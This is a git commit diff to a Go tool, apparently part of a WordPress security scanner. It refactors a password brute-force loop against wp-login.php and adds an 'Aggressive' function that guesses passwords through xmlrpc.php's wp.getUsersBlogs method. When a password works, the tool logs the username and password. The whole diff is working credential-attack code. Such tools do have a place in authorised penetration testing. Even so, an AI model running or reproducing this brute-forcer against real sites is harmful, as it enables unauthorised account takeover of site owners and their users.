e86b0b2a3e5b11dbce6549e4800846e32aa20292
blackcrw <blackzacky@protonmail.com>
2024-03-17 04:57:41 -0300

    refactor: brute force users (#45)

--- tools/fuzzing/users.go
+++ tools/fuzzing/users.go
@@ -2,6 +2,7 @@ package fuzzing
 
 import (
 	"net/http"
+	"strings"
 
 	"github.com/institute-atri/ghttp"
 	"github.com/institute-atri/glogger"
@@ -20,15 +21,14 @@ func Passive(url, username string, passwords []string) {
 
 	request.SetContentType("application/x-www-form-urlencoded")
 
-	var done *bool
+	var done bool
 
 	for _, password := range passwords {
 		request.SetData("log=" + username + "&pwd=" + password + "&wp-submit=Acessar&redirect_to=" + url + "testcookie=1")
 
 		request.SetRedirectFunc(func(req *http.Request, via []*http.Request) error {
 			if req.Response.StatusCode == 302 {
-				glogger.Done("login:\n username:" + username + "\n password:" + password)
-				*done = true
+				done = true
 			}
 
 			return nil
@@ -36,11 +36,47 @@ func Passive(url, username string, passwords []string) {
 
 		_, err := request.Do()
 		glogger.ErrorHandling(err)
+
+		if done {
+			glogger.Done("login:\n username:" + username + "\n password:" + password)
+			break
+		}
 	}
 
-	if !*done {
+	if !done {
 		glogger.Danger("User password not found!")
 	}
 }
 
-func Agressive(url, username string, passwords []string) {}
+func Aggressive(url, username string, passwords []string) {
+	glogger.Info("Doing brute force attack...")
+
+	request := ghttp.NewHttp()
+
+	err := request.SetURL(url + "xmlrpc.php")
+	glogger.ErrorHandling(err)
+
+	err = request.SetMethod("POST")
+	glogger.ErrorHandling(err)
+
+	var done bool
+
+	for _, password := range passwords {
+		request.SetData("<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + username + "</value></param><param><value>" + password + "</value></param></params></methodCall>")
+
+		response, err := request.Do()
+		glogger.ErrorHandling(err)
+
+		if strings.Contains(strings.ToLower(response.BRaw), "admin") {
+			glogger.Done("login:\n username:" + username + "\n password:" + password)
+
+			done = true
+
+			break
+		}
+	}
+
+	if !done {
+		glogger.Danger("User password not found!")
+	}
+}
